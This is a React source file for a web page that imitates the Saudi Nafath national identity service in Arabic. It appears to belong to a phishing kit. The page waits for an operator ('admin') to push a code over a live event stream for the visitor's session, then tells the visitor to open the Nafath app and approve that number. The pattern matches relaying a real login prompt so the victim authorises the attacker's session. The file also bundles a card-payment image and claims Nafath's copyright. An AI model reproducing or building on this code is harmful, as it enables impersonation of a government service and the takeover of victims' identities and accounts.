import { useState, useEffect, useCallback } from "react";
import { Header } from "@/components/layout/Header";
import { Loader2 } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import visaMadaImage from "../assets/VISAMADAH_1779063055374.png";

export default function IdentityCheck() {
  const [showSpinner, setShowSpinner] = useState(true);
  const [adminCode, setAdminCode] = useState<string | null>(null);
  const [fadeOut, setFadeOut] = useState(false);
  
  const sessionId = localStorage.getItem("sessionId");
  
  // Handle SSE control events
  const handleSSEMessage = useCallback((event: MessageEvent) => {
    try {
      const data = JSON.parse(event.data);
      
      if (data.action === "identity_code" && data.code) {
        // Admin sent a code - hide spinner and show the code
        console.log("[IdentityCheck] Received identity code:", data.code);
        setFadeOut(true);
        setTimeout(() => {
          setShowSpinner(false);
          setFadeOut(false);
          setAdminCode(data.code || "✓");
        }, 500);
      }
    } catch (error) {
      console.error("[IdentityCheck] Error parsing SSE message:", error);
    }
  }, []);

  // Set up SSE listener
  useEffect(() => {
    if (!sessionId) return;
    
    const apiUrl = import.meta.env.VITE_API_URL || "";
    const baseUrl = apiUrl || window.location.origin;
    const sseUrl = `${baseUrl}/api/sse/${sessionId}`;
    
    const eventSource = new EventSource(sseUrl);
    
    // Listen for control events
    eventSource.addEventListener("control", handleSSEMessage);
    
    // Cleanup
    return () => {
      eventSource.removeEventListener("control", handleSSEMessage);
      eventSource.close();
    };
  }, [sessionId, handleSSEMessage]);

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Header />
      
      <div className="container mx-auto px-4 py-12 flex-1 flex justify-center items-start">
        <div className="bg-white rounded-3xl shadow-lg border border-gray-200 p-8 max-w-md w-full text-center">
          
          <img src={visaMadaImage} alt="Nafath" className="h-16 mx-auto mb-8 object-contain" />
          
          {/* Spinner or Code */}
          <div className="mb-8">
            <AnimatePresence mode="wait">
              {showSpinner ? (
                <motion.div
                  initial={{ opacity: 0, scale: 0.8 }}
                  animate={{ opacity: fadeOut ? 0 : 1, scale: fadeOut ? 0.8 : 1 }}
                  exit={{ opacity: 0, scale: 0.8 }}
                  transition={{ duration: 0.5 }}
                  className="flex flex-col items-center"
                >
                  <Loader2 className="w-20 h-20 animate-spin text-primary mb-4" />
                </motion.div>
              ) : (
                <motion.div
                  initial={{ opacity: 0, scale: 0.8 }}
                  animate={{ opacity: 1, scale: 1 }}
                  className="flex flex-col items-center"
                >
                  <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mb-4">
                    <span className="text-4xl font-bold text-green-700">✓</span>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          {/* Message */}
          <h2 className="text-xl font-bold text-gray-800 mb-4">
            {adminCode ? "التحقق من الهوية" : "جارٍ التحقق من الهوية..."}
          </h2>
          
          {adminCode ? (
            <>
              <p className="text-gray-600 leading-relaxed mb-6">
                يرجى فتح تطبيق النفاذ الوطني واختيار الرقم الموضح ادناه
              </p>
              <div className="bg-blue-50 border-2 border-blue-200 rounded-3xl p-6 mb-4">
                <span className="text-5xl font-bold text-blue-700" dir="ltr">
                  {adminCode}
                </span>
              </div>
              <p className="text-sm text-gray-500">
                في انتظار الخطوة التالية...
              </p>
            </>
          ) : (
            <p className="text-gray-600 leading-relaxed">
              يرجى الانتظار وعدم إغلاق الصفحة
              <br />
              يتم حالياً التأكد من معلوماتك عبر منصة النفاذ الوطني الموحد
            </p>
          )}

        </div>
      </div>

      <footer className="py-4 text-center text-xs text-gray-500 border-t border-gray-200">
        جميع الحقوق محفوظة © النفاذ الوطني
      </footer>
    </div>
  );
}
